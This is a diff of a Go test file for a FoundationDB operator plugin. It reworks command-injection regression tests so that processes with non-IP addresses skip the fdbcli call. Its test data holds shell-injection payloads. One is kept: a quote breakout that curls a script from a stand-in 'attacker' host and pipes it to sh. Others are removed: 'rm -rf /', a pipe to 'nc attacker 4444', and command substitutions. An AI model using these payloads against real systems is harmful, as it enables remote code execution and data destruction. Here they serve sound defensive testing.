@@ -1128,9 +1128,8 @@ var _ = Describe("[plugin] analyze cluster", func() {
 			)
 		}
 
-		// Regression test for the OS command injection: shell metacharacters in the address must land
-		// inside argv[2], never as a standalone argv element a shell could re-parse.
-		DescribeTable("forwards each argv element verbatim and never invokes a shell",
+		// IP-addressed processes flow through to fdbcli kill as a single argv element. No shell wrapping.
+		DescribeTable("forwards valid IP processes through argv with no shell",
 			func(addr fdbv1beta2.ProcessAddress, expectedKillAddr string) {
 				runAutoFix(getStatusWithProcess(addr))
 
@@ -1142,30 +1141,27 @@ var _ = Describe("[plugin] analyze cluster", func() {
 				Expect(commandArgs()).NotTo(ContainElement("/bin/bash"))
 				Expect(commandArgs()).NotTo(ContainElement("/bin/sh"))
 				Expect(commandArgs()).NotTo(ContainElement("-c"))
-				Expect(commandArgs()).NotTo(ContainElement(expectedKillAddr))
 			},
-			Entry("happy path: benign IP:port",
+			Entry("IPv4:port",
 				fdbv1beta2.ProcessAddress{IPAddress: net.ParseIP("10.0.1.42"), Port: 4500},
 				"10.0.1.42:4500"),
-			Entry("malicious: single-quote breakout",
+		)
+
+		// Non-IP addresses get dropped before fdbcli is ever invoked. fdbserver only reports IPs in
+		// status, so anything else here is either malformed or attacker-controlled.
+		DescribeTable("skips auto-fix for processes whose address is not a valid IP",
+			func(addr fdbv1beta2.ProcessAddress) {
+				runAutoFix(getStatusWithProcess(addr))
+
+				Expect(capturedURL).To(BeNil(), "fdbcli should not have been invoked")
+			},
+			Entry("non-IP address",
+				fdbv1beta2.ProcessAddress{StringAddress: "pod-1.cluster.local", Port: 4500}),
+			Entry("malicious payload (shell metacharacters)",
 				fdbv1beta2.ProcessAddress{
 					StringAddress: "evil';curl http://attacker/x|sh;echo 'pwned",
 					Port:          4500,
-				},
-				// JoinHostPort brackets the host when it contains `:` (here, from http://).
-				"[evil';curl http://attacker/x|sh;echo 'pwned]:4500"),
-			Entry("malicious: backtick command substitution",
-				fdbv1beta2.ProcessAddress{StringAddress: "host`id`", Port: 4500},
-				"host`id`:4500"),
-			Entry("malicious: dollar command substitution",
-				fdbv1beta2.ProcessAddress{StringAddress: "host$(id)", Port: 4500},
-				"host$(id):4500"),
-			Entry("malicious: semicolon chaining",
-				fdbv1beta2.ProcessAddress{StringAddress: "host; rm -rf /", Port: 4500},
-				"host; rm -rf /:4500"),
-			Entry("malicious: pipe to remote shell",
-				fdbv1beta2.ProcessAddress{StringAddress: "host|nc attacker 4444", Port: 4500},
-				"host|nc attacker 4444:4500"),
+				}),
 		)
 	})
 })
